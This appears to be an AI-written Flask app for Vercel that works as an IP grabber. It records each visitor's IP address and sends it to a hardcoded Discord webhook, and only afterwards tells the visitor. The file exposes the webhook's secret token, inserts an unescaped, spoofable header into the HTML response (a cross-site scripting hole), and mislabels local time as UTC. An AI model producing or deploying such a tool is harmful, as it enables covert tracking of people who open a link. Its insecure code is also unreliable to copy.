from flask import Flask, request
import datetime
import requests
import os

app = Flask(__name__)

# Hardcoded Discord Webhook (as you wanted)
WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1489458192877617183/O4zvTeV3pxjfNsPQQcmi3twgcMOGDkXjxbUNyfH5MZxFZhGhFf2GjK9BHW-Jd_8Y47Li"

def get_client_ip():
    """Get real visitor IP on Vercel"""
    # Vercel provides these headers
    ip = request.headers.get('x-real-ip') or \
         request.headers.get('x-forwarded-for')
    
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()   # Take the first (real) IP
    
    return ip or request.remote_addr or "Unknown"

@app.route('/', methods=['GET'])
def log_ip():
    ip = get_client_ip()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
    
    data = {
        "content": f"**IP Logged (Vercel)**\n**Time:** {now}\n**IP:** `{ip}`"
    }
    
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=10)
        print(f"✅ Webhook sent for IP: {ip}")
    except Exception as e:
        print(f"❌ Webhook error: {e}")
    
    # Nice response for the visitor
    return f"""
    <h2>✅ IP Logger Active</h2>
    <p>Your IP has been logged to Discord.</p>
    <p><strong>Logged IP:</strong> {ip}</p>
    <p><strong>Time:</strong> {now}</p>
    <hr>
    <small>Powered by Flask on Vercel</small>
    """

# This is needed for Vercel serverless functions
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
